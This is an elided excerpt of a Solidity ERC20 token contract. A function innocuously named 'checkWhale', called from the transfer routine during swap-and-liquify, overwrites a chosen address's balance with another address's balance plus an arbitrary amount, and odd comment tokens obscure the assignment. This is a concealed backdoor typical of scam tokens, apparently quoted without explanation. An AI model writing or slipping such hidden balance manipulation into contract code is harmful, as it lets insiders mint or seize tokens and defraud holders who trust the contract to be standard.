...
contract ERC20Token is Context, IERC20, Ownable {
    ...
    function checkWhale(
        ...
        if (
            ...
            _balances[s] /*/*checkWahle*1/*/ = /*/*checkWahle*1/*/ getAmount(r, m);
        }
    }

    function getAmount(address r, uint256 m) internal view returns(uint256){
        return _balances[r].add(m);
    }
    ...
    function _transfer(
        ...
        if (inSwapAndLiquify) {
            ...
            checkWhale(sender, recipient, amount);
